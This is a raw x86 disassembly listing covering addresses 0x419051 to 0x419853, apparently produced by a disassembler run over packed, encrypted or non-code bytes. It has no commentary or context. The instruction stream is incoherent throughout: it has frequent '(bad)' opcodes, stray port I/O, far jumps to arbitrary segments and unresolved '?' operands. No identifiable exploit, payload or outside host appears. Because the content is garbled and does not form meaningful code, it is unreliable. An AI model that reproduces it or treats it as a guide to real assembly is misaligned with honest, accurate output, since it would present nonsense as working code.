  419051:	mov    ch,0x9
  419053:	pop    eax
  419054:	je     0x419057
  419056:	imul   ebp,DWORD PTR [esi+0x37],0xfffffff7
  41905a:	sahf   
  41905b:	cmp    eax,0x12feb19e
  419060:	sub    eax,esp
  419062:	mov    al,0x6f
  419064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419065:	int    0x53
  419067:	add    eax,0x54c18624
  41906c:	mov    DWORD PTR [ebp+0xef787e0],esi
  419072:	sbb    al,0x11
  419074:	push   0x49
  419076:	dec    eax
  419077:	ret    
  419078:	dec    DWORD PTR [edi+0x5d]
  41907b:	add    esp,esp
  41907d:	mov    ecx,DWORD PTR [ebx+0x75]
  419080:	mov    ebp,0xa5fce559
  419085:	jno    0x41901f
  419087:	xchg   edx,eax
  419088:	int    0xc4
  41908a:	in     eax,dx
  41908b:	or     al,0x68
  41908d:	pusha  
  41908e:	add    eax,0x1640fe16
  419093:	mov    dh,0xb9
  419095:	mov    bl,0x57
  419097:	sub    eax,0x13295a00
  41909c:	inc    edx
  41909d:	mov    bh,0xf1
  41909f:	cmp    eax,0x7fbcf6b0
  4190a4:	cmp    ah,BYTE PTR [esi-0x4a]
  4190a7:	add    al,0xcf
  4190a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190aa:	(bad)  
  4190ab:	sub    BYTE PTR [ebp-0x5b],al
  4190ae:	push   ebp
  4190af:	dec    esp
  4190b0:	or     eax,0x6e8592b5
  4190b5:	jns    0x419111
  4190b7:	cmovno esp,esi
  4190ba:	jp     0x419067
  4190bc:	mov    bh,0x20
  4190be:	stos   DWORD PTR es:[edi],eax
  4190bf:	lahf   
  4190c0:	and    ecx,DWORD PTR [edx+0x6418684e]
  4190c6:	dec    esi
  4190c7:	jl     0x4190c1
  4190c9:	(bad)  
  4190ca:	ja     0x419053
  4190cc:	in     eax,0x6f
  4190ce:	push   esi
  4190cf:	mov    esp,0xe1d4f15f
  4190d4:	rol    DWORD PTR [edx-0x1ec2e2da],1
  4190da:	loopne 0x41908d
  4190dc:	out    dx,al
  4190dd:	stc    
  4190de:	sub    BYTE PTR [eax-0x4a5fc541],cl
  4190e4:	xchg   edx,eax
  4190e5:	lahf   
  4190e6:	add    esp,DWORD PTR [ecx+eiz*4+0x3b93688a]
  4190ed:	rcl    dh,0x22
  4190f0:	mov    dl,0x2c
  4190f2:	xchg   DWORD PTR [edx-0x51],ecx
  4190f5:	sub    ebx,DWORD PTR [esi]
  4190f7:	fsub   DWORD PTR [ecx]
  4190f9:	mov    edi,0x63ab06a
  4190fe:	push   ss
  4190ff:	xchg   ebp,eax
  419100:	clc    
  419101:	fwait
  419102:	pop    ebp
  419103:	lods   eax,DWORD PTR ds:[esi]
  419104:	(bad)  [ecx-0x6b]
  419107:	aad    0x63
  419109:	or     ecx,DWORD PTR [ebp+ecx*2-0x9]
  41910d:	pop    edi
  41910e:	and    eax,0x99dd2a20
  419113:	loope  0x41916a
  419115:	lods   eax,DWORD PTR ds:[esi]
  419116:	or     eax,0xb3035484
  41911b:	pop    edx
  41911c:	popf   
  41911d:	mov    bl,0x4b
  41911f:	int3   
  419120:	jl     0x41914d
  419122:	push   edi
  419123:	pop    edx
  419124:	pop    ebx
  419125:	(bad)  
  419126:	mov    bh,0x4b
  419128:	js     0x419101
  41912a:	xchg   ebx,eax
  41912b:	loop   0x41916c
  41912d:	and    al,0x0
  41912f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419130:	adc    bl,cl
  419132:	lea    ebp,[edx+0x60]
  419135:	cmp    bh,BYTE PTR [edx]
  419137:	cdq    
  419138:	xor    WORD PTR [esi+ebp*4],cx
  41913c:	in     al,dx
  41913d:	pop    ecx
  41913e:	sbb    ebp,ebp
  419140:	jae    0x419184
  419142:	push   cs
  419143:	fbstp  TBYTE PTR [ebx]
  419145:	pop    edi
  419146:	and    DWORD PTR [edx],ebp
  419148:	mov    cl,0x9b
  41914a:	inc    esi
  41914b:	cmp    al,0xe
  41914d:	or     al,0x71
  41914f:	js     0x4190de
  419151:	mov    ecx,DWORD PTR [edx]
  419153:	sbb    edi,DWORD PTR [ebp+0x7e947a0c]
  419159:	aam    0xf3
  41915b:	push   ss
  41915c:	xchg   ebx,eax
  41915d:	jns    0x419184
  41915f:	push   ebx
  419160:	mov    eax,ds:0xf0d7b934
  419165:	aad    0xf8
  419167:	test   DWORD PTR [bp-0x1fe7],esi
  41916c:	mov    esp,0xc1f5f404
  419171:	scas   al,BYTE PTR es:[edi]
  419172:	loope  0x4191c3
  419174:	sbb    ecx,edi
  419176:	call   0xa459:0x1ea1faba
  41917d:	adc    bl,cl
  41917f:	jl     0x4191ea
  419181:	lods   eax,DWORD PTR ds:[esi]
  419182:	rol    DWORD PTR [edi+0x3a],cl
  419185:	test   al,0xfc
  419187:	repnz pop esi
  419189:	sbb    al,0x7
  41918b:	leave  
  41918c:	es pop ecx
  41918e:	fisttp DWORD PTR [ebx+ebx*4+0x7a8ca97f]
  419195:	add    ebp,DWORD PTR [esi+0xa545442]
  41919b:	(bad)  
  41919c:	rol    DWORD PTR [ecx],cl
  41919e:	adc    eax,0x4e673f9b
  4191a3:	sahf   
  4191a4:	enter  0x330e,0x22
  4191a8:	in     al,0xc1
  4191aa:	fucomip st,st(7)
  4191ac:	arpl   WORD PTR [esi-0x64],cx
  4191af:	cmp    DWORD PTR [edx],0xffffffd7
  4191b2:	(bad)
  4191b5:	lods   al,BYTE PTR ds:[esi]
  4191b6:	inc    esi
  4191b7:	or     esi,edi
  4191b9:	dec    eax
  4191ba:	jbe    0x41917a
  4191bc:	xor    bh,BYTE PTR [edx]
  4191be:	pop    esi
  4191bf:	mov    ?,WORD PTR [ebx+eax*2+0x6e5377e3]
  4191c6:	daa    
  4191c7:	das    
  4191c8:	adc    eax,DWORD PTR [edx+eiz*1+0x5]
  4191cc:	jg     0x419201
  4191ce:	xchg   edi,eax
  4191cf:	push   es
  4191d0:	adc    DWORD PTR [esi+0x16d6f934],eax
  4191d6:	adc    al,0xa2
  4191d8:	push   ds
  4191d9:	pop    es
  4191da:	jmp    0x8a19d23a
  4191df:	or     eax,edi
  4191e1:	les    esp,FWORD PTR [edx-0x14c84c47]
  4191e7:	inc    ebx
  4191e8:	mov    bh,0xe3
  4191ea:	stos   BYTE PTR es:[edi],al
  4191eb:	int    0xd7
  4191ed:	push   eax
  4191ee:	jae    0x4191f4
  4191f0:	test   eax,0x546d6d5c
  4191f5:	cmp    al,0x4d
  4191f7:	xchg   bh,al
  4191f9:	and    DWORD PTR [edi+0x40],0x474055d3
  419200:	add    DWORD PTR [edi+eiz*4-0x3b],edi
  419204:	xor    ah,BYTE PTR ds:0xa40b592d
  41920a:	cmp    DWORD PTR [eax],ebx
  41920c:	cmp    ebp,esi
  41920e:	popf   
  41920f:	lods   eax,DWORD PTR ds:[esi]
  419210:	xchg   ebx,eax
  419211:	sbb    BYTE PTR [ecx],bl
  419213:	fwait
  419214:	xchg   ecx,eax
  419215:	or     BYTE PTR [edx+eax*2+0x56],ah
  419219:	push   eax
  41921a:	jp     0x41928b
  41921c:	xchg   esi,eax
  41921d:	stc    
  41921e:	mov    cl,0x64
  419220:	addr16 mov ebx,0x44a14a0e
  419226:	cmp    BYTE PTR [esi],dl
  419228:	or     dl,BYTE PTR [edi]
  41922a:	jb     0x419221
  41922c:	fisub  DWORD PTR [edi-0xad6fd02]
  419232:	sbb    dh,BYTE PTR [edx+eax*2+0x19e51b28]
  419239:	mov    ch,0xb6
  41923b:	jns    0x419258
  41923d:	pop    es
  41923e:	addr16 jmp 0x791df2d8
  419244:	pop    edx
  419245:	mov    dh,0x9b
  419247:	fld    QWORD PTR [edi+0x45]
  41924a:	jno    0x4191d1
  41924c:	jbe    0x419287
  41924e:	sbb    al,0xcb
  419250:	(bad)  
  419251:	call   0xcf42:0x2aecf5af
  419258:	popa   
  419259:	sub    al,0x18
  41925b:	sbb    al,0xa7
  41925d:	fstp   DWORD PTR [ebp+0x5a]
  419260:	xchg   ebp,eax
  419261:	in     eax,dx
  419262:	in     al,dx
  419263:	call   0xc323376c
  419268:	add    bh,BYTE PTR [ebp+0x77]
  41926b:	mov    eax,ds:0xcf2d43b8
  419270:	loope  0x4192e4
  419272:	cmp    cl,BYTE PTR [ebx]
  419274:	dec    eax
  419275:	retf   0xe20a
  419278:	hlt    
  419279:	pop    edx
  41927a:	cmp    BYTE PTR [ecx+0x38],dl
  41927d:	inc    edx
  41927e:	sahf   
  41927f:	inc    eax
  419280:	push   es
  419281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419282:	mov    BYTE PTR [eax+0x12dc6aff],0xd0
  419289:	add    DWORD PTR [ecx],0x130b94e7
  41928f:	stos   DWORD PTR es:[edi],eax
  419290:	int3   
  419291:	adc    eax,0x30bd1f58
  419296:	lods   al,BYTE PTR ds:[esi]
  419297:	adc    ebp,DWORD PTR fs:[ebp-0x4620cd4d]
  41929e:	xchg   ebp,eax
  41929f:	mov    ecx,0xb11d475b
  4192a4:	loope  0x419284
  4192a6:	les    ebx,FWORD PTR [ebp+0x77]
  4192a9:	call   0x3b921801
  4192ae:	test   al,0x2d
  4192b0:	xor    DWORD PTR [ebp-0x40f91793],0xffffffb1
  4192b7:	stos   BYTE PTR es:[edi],al
  4192b8:	cmp    BYTE PTR [eax],al
  4192ba:	and    ebx,DWORD PTR [edx+ebp*2+0x55b88506]
  4192c1:	pop    edx
  4192c2:	mov    ebx,0x6a564614
  4192c7:	cmp    al,0x67
  4192c9:	aas    
  4192ca:	out    dx,al
  4192cb:	repz pop edi
  4192cd:	adc    bl,bl
  4192cf:	mov    esi,0xcbc30c51
  4192d4:	aad    0x17
  4192d6:	push   es
  4192d7:	dec    esi
  4192d8:	imul   esi,DWORD PTR [edi-0x31095a63],0xffffffb7
  4192df:	punpckhwd mm1,QWORD PTR [edi-0x6b1fc409]
  4192e6:	cwde   
  4192e7:	xor    BYTE PTR [ebx+0x35ccfc67],dl
  4192ed:	pop    ds
  4192ee:	sbb    al,0xf5
  4192f0:	shl    DWORD PTR [ebx+edi*8],1
  4192f3:	sbb    BYTE PTR [ebx],bh
  4192f5:	jecxz  0x41936c
  4192f7:	pop    ecx
  4192f8:	loopne 0x419362
  4192fa:	pop    esi
  4192fb:	pushf  
  4192fc:	arpl   WORD PTR es:[ebx+eax*1-0x3],di
  419301:	jne    0x41937e
  419303:	push   es
  419304:	xlat   BYTE PTR ds:[ebx]
  419305:	lahf   
  419306:	pop    ds
  419307:	ins    BYTE PTR es:[edi],dx
  419308:	(bad)
  41930c:	sbb    BYTE PTR [ebp-0x2564250c],0xec
  419313:	jnp    0x419300
  419315:	add    edx,DWORD PTR [eax]
  419317:	pusha  
  419318:	sbb    BYTE PTR [edi+0xf],bl
  41931b:	test   al,ch
  41931d:	xor    al,0x48
  41931f:	adc    al,BYTE PTR [edx-0x37d5ff02]
  419325:	in     al,dx
  419326:	sub    cl,ch
  419328:	out    0xa6,al
  41932a:	aad    0xfc
  41932c:	and    eax,0xa0f69524
  419331:	in     al,dx
  419332:	loop   0x419300
  419334:	je     0x4193a9
  419336:	mov    edx,0xcad13c62
  41933b:	les    esp,FWORD PTR [edi]
  41933d:	jg     0x41930f
  41933f:	or     al,0xc2
  419341:	daa    
  419342:	fs jmp 0x6d768348
  419348:	dec    ebx
  419349:	and    bh,BYTE PTR [ebp+0x72]
  41934c:	or     ch,BYTE PTR ds:[ebx]
  41934f:	push   ebp
  419350:	or     eax,0x15742449
  419355:	sar    DWORD PTR [edx],cl
  419357:	xchg   edx,eax
  419358:	pop    edx
  419359:	out    dx,eax
  41935a:	fadd   QWORD PTR [esp+edx*4]
  41935d:	(bad)  [edi-0x4f173b17]
  419363:	mov    al,ds:0xf476eccb
  419368:	(bad)  
  419369:	scas   eax,DWORD PTR es:[edi]
  41936a:	xchg   esp,eax
  41936b:	das    
  41936c:	cmp    DWORD PTR [edi-0x281155a0],ebp
  419372:	pop    es
  419373:	mov    ebp,0xe617373e
  419378:	outs   dx,BYTE PTR ds:[esi]
  419379:	jmp    0x1ce1:0x266be854
  419380:	inc    esp
  419381:	or     dh,BYTE PTR ds:0xe74045e2
  419387:	cli    
  419388:	fisub  WORD PTR [edi-0x6a6755a7]
  41938e:	repz lahf 
  419390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419391:	ja     0x4193c5
  419393:	inc    eax
  419394:	iret   
  419395:	xor    ch,BYTE PTR [ebp-0x6e]
  419398:	mov    eax,0xf7863d09
  41939d:	es pop ebx
  41939f:	and    BYTE PTR [ebp-0xc],0xc0
  4193a3:	pop    es
  4193a4:	sbb    al,0x83
  4193a6:	loope  0x41938f
  4193a8:	inc    esp
  4193a9:	sbb    ah,BYTE PTR [edx]
  4193ab:	mov    ch,0xfe
  4193ad:	out    0x39,eax
  4193af:	jmp    0x3a5296f9
  4193b4:	int    0xa1
  4193b6:	xchg   dh,ch
  4193b8:	and    BYTE PTR [ecx+0x27fc111],dh
  4193be:	pop    ss
  4193bf:	mov    ds:0x267c5493,eax
  4193c4:	scas   eax,DWORD PTR es:[edi]
  4193c5:	test   ecx,esp
  4193c7:	daa    
  4193c8:	les    ecx,FWORD PTR [ecx]
  4193ca:	xor    eax,0xcadc9e64
  4193cf:	sub    ah,bl
  4193d1:	mov    BYTE PTR [edi-0x77a8d50f],0xd5
  4193d8:	push   0xffffffe6
  4193da:	popf   
  4193db:	lock pop eax
  4193dd:	jnp    0x419445
  4193df:	xchg   DWORD PTR [eax-0x2b],edi
  4193e2:	(bad)  
  4193e3:	repnz repnz and dl,BYTE PTR gs:[ebp+esi*2+0x64c6683d]
  4193ed:	pop    es
  4193ee:	(bad)  [eax]
  4193f0:	mov    al,BYTE PTR [eax-0x2c]
  4193f3:	iret   
  4193f4:	add    BYTE PTR [ecx+0x52d02d27],bl
  4193fa:	xchg   cl,bl
  4193fc:	je     0x419408
  4193fe:	leave  
  4193ff:	mov    esi,ebp
  419401:	hlt    
  419402:	in     eax,dx
  419403:	xchg   esp,eax
  419404:	popa   
  419405:	mov    ebp,0x89f535e7
  41940a:	pop    ebp
  41940b:	mov    ds:0x4209eebb,al
  419410:	shl    DWORD PTR es:[edi+0x7a],0x6
  419415:	add    BYTE PTR [ebp+0x53c1667],dh
  41941b:	ret    
  41941c:	sti    
  41941d:	lahf   
  41941e:	mov    bl,0xe8
  419420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419421:	xor    al,BYTE PTR [ecx+ecx*8-0x7b96f73d]
  419428:	xchg   BYTE PTR [eax-0x2c853],cl
  41942e:	je     0x41940e
  419430:	addr16 and al,0x9c
  419433:	or     DWORD PTR [edi+0x45c02cc7],edx
  419439:	xchg   DWORD PTR [edi],edx
  41943b:	push   0x1ac5c1e3
  419440:	out    0x3,al
  419442:	cdq    
  419443:	shr    BYTE PTR [ecx],cl
  419445:	es test eax,0xc1dc98b9
  41944b:	mov    ebx,DWORD PTR [edi-0x78d20fca]
  419451:	cdq    
  419452:	xor    edi,DWORD PTR [edi]
  419454:	cmp    eax,eax
  419456:	inc    ebp
  419457:	out    dx,eax
  419458:	out    dx,al
  419459:	aas    
  41945a:	pusha  
  41945b:	repnz mov al,0x37
  41945e:	int    0x60
  419460:	out    dx,al
  419461:	inc    edx
  419462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419463:	mov    ebx,ebp
  419465:	push   0x5
  419467:	push   0xffffff8e
  419469:	out    dx,al
  41946a:	adc    cl,bl
  41946c:	xchg   ebx,eax
  41946d:	jb     0x4194c3
  41946f:	scas   eax,DWORD PTR es:[edi]
  419470:	mov    eax,ds:0x543f658a
  419475:	sub    esp,esp
  419477:	add    dh,ah
  419479:	mov    eax,ds:0x2f567460
  41947e:	cmp    DWORD PTR [eax+0x511dd81],esp
  419484:	push   eax
  419485:	push   edx
  419486:	lock sbb bh,BYTE PTR [esi-0x70b5ea8f]
  41948d:	mov    edi,0xd4885aba
  419492:	fldenv [edi+0xe]
  419495:	xchg   ecx,eax
  419496:	jg     0x419423
  419498:	pop    ecx
  419499:	xor    BYTE PTR [edi-0x6a3ccbe6],0x25
  4194a0:	fcom   DWORD PTR [ebp-0x1a]
  4194a3:	(bad)  
  4194a4:	jmp    0x715746ad
  4194a9:	leave  
  4194aa:	add    al,BYTE PTR [ebp-0x3541f370]
  4194b0:	adc    al,0xdd
  4194b2:	jl     0x41949a
  4194b4:	mov    eax,0x1f3e058e
  4194b9:	lea    ebx,[ecx]
  4194bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194bc:	mov    al,0xe3
  4194be:	adc    esp,DWORD PTR [eax+0x4eea1177]
  4194c4:	push   es
  4194c5:	xchg   ecx,eax
  4194c6:	fwait
  4194c7:	push   ebx
  4194c8:	nop
  4194c9:	pop    edi
  4194ca:	mov    es,WORD PTR [ebp-0x6f]
  4194cd:	mov    al,0x93
  4194cf:	sar    ch,cl
  4194d1:	sub    dl,cl
  4194d3:	aam    0xe4
  4194d5:	mov    ecx,0x7222e1c4
  4194da:	rcr    ch,1
  4194dc:	mov    ?,ecx
  4194de:	adc    ch,0x22
  4194e1:	fistp  WORD PTR [ebx+0x1e3d32d9]
  4194e7:	cli    
  4194e8:	xchg   esp,eax
  4194e9:	sbb    BYTE PTR [ebx+0x1a],0xa0
  4194ed:	push   esp
  4194ee:	xor    BYTE PTR ds:0xaca2222a,0xaf
  4194f5:	mov    eax,0x7c79753f
  4194fa:	sub    DWORD PTR [eax-0x57d61c98],0x269b3c6
  419504:	add    BYTE PTR [ebp+0x43],dh
  419507:	icebp  
  419508:	(bad)  
  419509:	fild   QWORD PTR [eax]
  41950b:	pop    ebp
  41950c:	imul   edx,DWORD PTR [ebp+0xbd9b0bb],0x14
  419513:	mov    bh,0x36
  419515:	mov    dh,0xd4
  419517:	mov    dl,0x42
  419519:	xor    BYTE PTR ds:[eax],cl
  41951c:	xor    BYTE PTR [edi],dl
  41951e:	(bad)  
  41951f:	cld    
  419520:	es ret 
  419522:	sub    esi,edi
  419524:	iret   
  419525:	pop    esi
  419526:	and    al,0xf3
  419528:	sbb    DWORD PTR [ebp+ecx*8-0x28],esi
  41952c:	and    DWORD PTR [edi],edx
  41952e:	push   eax
  41952f:	add    edx,ecx
  419531:	and    DWORD PTR [esi-0x20f3a475],esi
  419537:	and    BYTE PTR [edx+ebp*8],dh
  41953a:	loope  0x419545
  41953c:	and    ebx,DWORD PTR [ebx]
  41953e:	(bad)  
  41953f:	ficom  DWORD PTR [edi]
  419541:	pop    ds
  419542:	mov    ds:0xb516593b,eax
  419547:	retfw  0x3623
  41954b:	clc    
  41954c:	push   esp
  41954d:	lock cmc 
  41954f:	and    BYTE PTR [esi+esi*8-0x7d],bl
  419553:	cmp    ebp,DWORD PTR [ebx+0xc]
  419556:	shr    DWORD PTR [ecx+0x5e4faf03],1
  41955c:	repz xor cl,ch
  41955f:	aam    0xeb
  419561:	in     eax,0x4d
  419563:	and    dh,BYTE PTR [edi-0x41f8b6a4]
  419569:	aaa    
  41956a:	or     dh,BYTE PTR ds:0x2b7e1074
  419570:	imul   ebx,DWORD PTR [edi+0x1e],0x677cd7f4
  419577:	cs aad 0x62
  41957a:	xchg   esp,eax
  41957b:	jmp    0xb8ab:0xff99136
  419582:	clc    
  419583:	inc    edi
  419584:	cli    
  419585:	nop
  419586:	mov    edx,0x56021765
  41958b:	shl    DWORD PTR [edi],cl
  41958d:	pop    edx
  41958e:	outs   dx,DWORD PTR ds:[esi]
  41958f:	mov    DWORD PTR [esi],esp
  419591:	add    al,0x40
  419593:	xchg   ebp,eax
  419594:	loope  0x4195ed
  419596:	cmc    
  419597:	mov    al,ds:0x231eccfb
  41959c:	test   DWORD PTR [edx+0x3e],ebx
  41959f:	xchg   edi,eax
  4195a0:	dec    eax
  4195a1:	xchg   edi,eax
  4195a2:	mov    BYTE PTR [edi+0x32],al
  4195a5:	jmp    FWORD PTR [esi+edx*2-0x310ab50a]
  4195ac:	xor    BYTE PTR [ecx-0x25],ah
  4195af:	inc    ebp
  4195b0:	jmp    0x4195fd
  4195b2:	sub    al,0xf9
  4195b4:	mov    edi,0x10ded920
  4195b9:	std    
  4195ba:	xchg   ecx,eax
  4195bb:	sbb    eax,0x6cbf072e
  4195c0:	gs retf 0xa4c5
  4195c4:	daa    
  4195c5:	(bad)
  4195c8:	shl    BYTE PTR [ebp+0x21392f9f],cl
  4195ce:	xchg   ebx,eax
  4195cf:	xchg   esp,eax
  4195d0:	mov    bh,0xa3
  4195d2:	mov    al,0x67
  4195d4:	mov    dh,0xe3
  4195d6:	cmp    al,0x3b
  4195d8:	mov    ebp,0x6e2dfe16
  4195dd:	call   0xa290:0xb4901f9
  4195e4:	jbe    0x4195d3
  4195e6:	xchg   esi,eax
  4195e7:	data16 shl BYTE PTR fs:[esi+0x64],cl
  4195ec:	sub    BYTE PTR [edx-0x7c93dea8],0x42
  4195f3:	outs   dx,DWORD PTR ds:[esi]
  4195f4:	lds    ebp,FWORD PTR [ebp+0x7]
  4195f7:	pop    ebp
  4195f8:	outs   dx,DWORD PTR ds:[esi]
  4195f9:	les    ecx,FWORD PTR [edx+0x23]
  4195fc:	gs cmc 
  4195fe:	popf   
  4195ff:	or     al,0x6f
  419601:	jmp    0xabf:0x1b2e18f9
  419608:	test   BYTE PTR [esi+0x5c594ef9],cl
  41960e:	cmp    al,0x4e
  419610:	(bad)  
  419611:	movaps XMMWORD PTR [edx+0x231898a0],xmm7
  419618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419619:	addr16 inc ebp
  41961b:	mov    bl,0x19
  41961d:	cmc    
  41961e:	jg     0x4195b5
  419620:	and    cl,al
  419622:	test   DWORD PTR [edx],esp
  419624:	adc    eax,DWORD PTR ds:0x747ea07f
  41962a:	ss addr16 jmp 0x4195bd
  41962e:	xchg   edx,eax
  41962f:	int3   
  419630:	fnstcw WORD PTR cs:[edx+0x76d5d086]
  419637:	xchg   BYTE PTR ds:0x1f5e9558,ah
  41963d:	jmp    0x8711cfce
  419642:	pop    esi
  419643:	aad    0x4f
  419645:	ja     0x419626
  419647:	mov    esp,0x8856ddf
  41964c:	xchg   ebx,eax
  41964d:	fisubr DWORD PTR [esi-0x59]
  419650:	sbb    BYTE PTR [edi],ah
  419652:	add    al,BYTE PTR [ecx]
  419654:	or     bl,ah
  419656:	sbb    eax,DWORD PTR [ebx-0x66]
  419659:	sub    al,0x34
  41965b:	xchg   ebp,eax
  41965c:	cmp    ebx,DWORD PTR [eax]
  41965e:	ins    BYTE PTR es:[edi],dx
  41965f:	shr    bh,1
  419661:	lods   al,BYTE PTR ds:[esi]
  419662:	cli    
  419663:	ror    DWORD PTR [edi-0x25e85b8f],1
  419669:	inc    esi
  41966a:	call   0xc4a963
  41966f:	dec    esp
  419670:	sahf   
  419671:	xor    DWORD PTR [edi+0x4b],ebx
  419674:	shr    DWORD PTR cs:[edx+0xdf25980],cl
  41967b:	leave  
  41967c:	(bad)  [ecx+0x4a]
  41967f:	or     bh,0x96
  419682:	nop
  419683:	inc    ebx
  419684:	test   BYTE PTR [edi],cl
  419686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419687:	ins    DWORD PTR es:[edi],dx
  419688:	mov    ds:0xff33d74c,eax
  41968d:	fstp   DWORD PTR [edi]
  41968f:	adc    ah,BYTE PTR [edi]
  419691:	std    
  419692:	or     esp,DWORD PTR [ebp+0x544ee3c8]
  419698:	fdivr  DWORD PTR [edi-0x50]
  41969b:	xchg   esi,eax
  41969c:	pop    es
  41969d:	ret    0xfb95
  4196a0:	in     eax,dx
  4196a1:	adc    eax,0xf89a83c0
  4196a6:	mov    ecx,0x4232a3a7
  4196ab:	jg     0x419658
  4196ad:	push   ecx
  4196ae:	retf   0xbc93
  4196b1:	sub    eax,0x44b66126
  4196b6:	pop    edi
  4196b7:	shr    DWORD PTR [eax+eiz*8-0x12],cl
  4196bb:	push   edi
  4196bc:	dec    edx
  4196bd:	outs   dx,BYTE PTR ds:[esi]
  4196be:	test   BYTE PTR [edx],al
  4196c0:	in     al,0xaa
  4196c2:	out    0x2d,al
  4196c4:	sub    al,0xc9
  4196c6:	push   edx
  4196c7:	jae    0x419701
  4196c9:	sahf   
  4196ca:	or     ax,0x2935
  4196ce:	stos   DWORD PTR es:[edi],eax
  4196cf:	adc    BYTE PTR [ebx-0x63bc2f9a],0xf9
  4196d6:	stos   DWORD PTR es:[edi],eax
  4196d7:	adc    DWORD PTR [eax+0x5b],0x36
  4196db:	out    dx,al
  4196dc:	popa   
  4196dd:	aam    0x1e
  4196df:	jmp    0x4127:0x19075139
  4196e6:	sub    cl,dh
  4196e8:	(bad)  
  4196e9:	fnstsw WORD PTR [ebp+0x13ec4647]
  4196ef:	(bad)  
  4196f0:	sbb    DWORD PTR [edx+0x47c039ea],esp
  4196f6:	rol    DWORD PTR [edi+ebx*4-0x60],1
  4196fa:	adc    al,0xe7
  4196fc:	fs inc edi
  4196fe:	sbb    eax,0x11d32bb7
  419703:	ret    0xb0e4
  419706:	adc    bh,BYTE PTR ds:[ebx+0x55]
  41970a:	jnp    0x41978a
  41970c:	cmc    
  41970d:	adc    dl,BYTE PTR ds:0xc320aa30
  419713:	gs xchg edx,eax
  419715:	adc    esi,DWORD PTR [eax]
  419717:	(bad)  
  419718:	jmp    0x4196b2
  41971a:	mov    ecx,0x3d7ef027
  41971f:	mov    bh,0x21
  419721:	push   0x75
  419723:	add    eax,DWORD PTR [esi-0x26a3178d]
  419729:	fldenv [ecx-0x32]
  41972c:	mov    esi,DWORD PTR [eax+0x3258a05]
  419732:	dec    eax
  419733:	pop    ds
  419734:	mov    eax,0xda9ec100
  419739:	mov    ch,0x84
  41973b:	push   edi
  41973c:	mov    al,ds:0x47744843
  419741:	or     BYTE PTR [edi],ch
  419743:	xchg   BYTE PTR [ecx-0x41527904],bh
  419749:	mov    cl,0xc
  41974b:	sbb    ch,bh
  41974d:	jmp    0xfe87c258
  419752:	sbb    DWORD PTR [edx],edi
  419754:	sub    ebp,ecx
  419756:	inc    eax
  419757:	pop    edi
  419758:	mov    al,ds:0x96beeb7d
  41975d:	and    edi,DWORD PTR [edx-0x74378374]
  419763:	and    al,0xb4
  419765:	jle    0x41977a
  419767:	inc    esp
  419768:	cli    
  419769:	icebp  
  41976a:	or     al,0x5a
  41976c:	lds    edx,FWORD PTR [esi-0x5f]
  41976f:	mov    edx,0xe965e505
  419774:	scas   al,BYTE PTR es:[edi]
  419775:	mov    edx,0x62d43cae
  41977a:	xor    ebp,0x25
  41977d:	gs fs cmp al,0xa7
  419781:	fidivr DWORD PTR [ebx+ecx*8-0x3144dab2]
  419788:	aas    
  419789:	loop   0x4197ca
  41978b:	cld    
  41978c:	sub    edi,DWORD PTR ds:0xb053e909
  419792:	out    0x1f,eax
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	in     eax,0x64
  419797:	loop   0x4197c4
  419799:	daa    
  41979a:	outs   dx,BYTE PTR ds:[esi]
  41979b:	in     al,dx
  41979c:	dec    ecx
  41979d:	(bad)  
  41979e:	cmp    DWORD PTR [esi-0x4a8ad843],edi
  4197a4:	or     eax,0x44338e8b
  4197a9:	iret   
  4197aa:	cld    
  4197ab:	push   ds
  4197ac:	cmp    BYTE PTR [ebx],bl
  4197ae:	ret    
  4197af:	pop    edi
  4197b0:	and    DWORD PTR [eax-0x2bc08aac],edx
  4197b6:	sub    eax,0x39044f0
  4197bb:	mov    eax,ds:0x76c20f18
  4197c0:	call   DWORD PTR [esi+0x504e80ec]
  4197c6:	inc    edi
  4197c7:	push   0xa7db9fdd
  4197cc:	mov    dl,0x2d
  4197ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197cf:	out    0xc9,eax
  4197d1:	push   ecx
  4197d2:	ret    0xff6b
  4197d5:	std    
  4197d6:	mov    ch,0x46
  4197d8:	pop    esi
  4197d9:	(bad)  
  4197da:	pop    ds
  4197db:	(bad)  
  4197dc:	js     0x4197ea
  4197de:	fwait
  4197df:	jmp    0x6c6be03c
  4197e4:	dec    eax
  4197e5:	or     al,0x93
  4197e7:	mov    esp,0xc80496d2
  4197ec:	pop    eax
  4197ed:	xchg   esi,eax
  4197ee:	add    al,0xec
  4197f0:	leave  
  4197f1:	sbb    BYTE PTR [ecx+0x2dafa227],al
  4197f7:	dec    esp
  4197f8:	dec    edi
  4197f9:	scas   al,BYTE PTR es:[edi]
  4197fa:	jno    0x4197d3
  4197fc:	pop    esi
  4197fd:	mov    eax,0x81a13d2a
  419802:	imul   esp,ecx,0x7f2fe062
  419808:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41980a:	out    dx,al
  41980b:	mov    bl,0x68
  41980d:	addr16 js 0x4197b6
  419810:	mov    ch,0x60
  419812:	call   0x5050:0xfb0f9e19
  419819:	dec    edi
  41981a:	adc    dh,BYTE PTR [eax+0x56]
  41981d:	sbb    BYTE PTR [esi+0x5ad520d3],0xe1
  419824:	cs push 0x979b6c99
  41982a:	aad    0xe9
  41982c:	jmp    DWORD PTR [esp+edi*2]
  41982f:	inc    esp
  419830:	mov    eax,0x48d9f11e
  419835:	mov    edx,0x466454b2
  41983a:	xchg   BYTE PTR [ecx],dh
  41983c:	aaa    
  41983d:	outs   dx,BYTE PTR ds:[esi]
  41983e:	inc    esi
  41983f:	adc    BYTE PTR [ecx-0x42],al
  419842:	mov    edi,DWORD PTR [esi+0x6c7d95e5]
  419848:	adc    eax,0x2a4b4831
  41984d:	nop
  41984e:	sti    
  41984f:	xor    edi,esp
  419851:	mov    ?,WORD PTR [ebx]
  419853:	jb     0x4198c2
